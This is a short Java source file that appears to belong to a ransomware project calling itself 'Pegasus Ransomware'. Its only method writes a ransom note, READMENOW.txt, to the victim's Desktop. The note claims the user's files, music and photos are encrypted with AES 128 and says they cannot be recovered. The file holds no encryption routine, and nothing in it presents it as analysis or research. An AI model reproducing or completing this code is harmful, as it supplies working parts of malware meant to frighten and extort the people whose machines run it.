import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class Make {

    public void method() throws IOException {

        File f = new File(System.getProperty("user.home") + "/Desktop/READMENOW.txt");
        BufferedWriter bw = new BufferedWriter(new FileWriter(f));
        bw.append("FILES, MUSIC AND PHOTOS ARE ENCRYPTED!");
        bw.newLine();
        bw.append("----------------------------");
        bw.newLine();
        bw.append("");
        bw.newLine();
        bw.append("");
        bw.newLine();
        bw.append("[+] WHAT HAPPENED?");
        bw.newLine();
        bw.append("Your files have been encrypted by the Pegasus Ransomware.");
        bw.newLine();
        bw.append("Pegasus uses high end obfuscation and AES 128, so don't worry about cracking the key.");
        bw.newLine();
        bw.append("");
        bw.newLine();
        bw.append("");
        bw.newLine();
        bw.append("[+] CAN I GET THEM BACK?");
        bw.newLine();
        bw.append("No.");
        bw.newLine();
        bw.append("");
        bw.newLine();
        bw.append("----------------------------");
        bw.newLine();
        bw.append("Have a (not really) good day:");
        bw.newLine();
        bw.append("-reo");
        bw.close();
    }
}
